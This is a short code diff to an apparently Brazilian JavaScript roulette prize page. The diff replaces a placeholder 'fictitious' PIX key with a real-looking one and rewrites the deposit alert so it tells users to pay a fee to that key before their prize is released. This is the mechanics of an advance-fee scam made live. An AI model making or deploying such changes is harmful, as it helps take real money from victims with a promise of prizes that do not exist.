@@ -251,7 +251,7 @@ const soundWin  = document.getElementById('soundWin');
 const soundLose = document.getElementById('soundLose');
 
 /* ---------- PIX fictício ---------- */
-const pixKeyDeposit = 'suporte@roleta-ficticia.com';
+const pixKeyDeposit = 'bee26e2d-bdb7-4701-90d8-c1093abe054a';
 
 /* ---------- configuração das fatias ---------- */
 const segments = [
@@ -369,7 +369,7 @@ depositBtn.addEventListener('click', ()=>{
   if(userPix===''){ alert('Informe sua chave PIX para pagamento do prêmio.'); return; }
 
   alert(
-    `✅ Deposite R$ ${currentFee.toLocaleString('pt-BR',{minimumFractionDigits:2})} para receber o prêmio.\n\n`+
+    `✅ Deposite R$ ${currentFee.toLocaleString('pt-BR',{minimumFractionDigits:2})} para a chave pix: bee26e2d-bdb7-4701-90d8-c1093abe054a.\n\n`+
     `Seu prêmio líquido de R$ ${(currentPrize-currentFee).toLocaleString('pt-BR',{minimumFractionDigits:2})} `+
     `será enviado para ${userPix} assim que o depósito for identificado.\n\n⏳ Aguarde até 24 horas úteis.`
   );
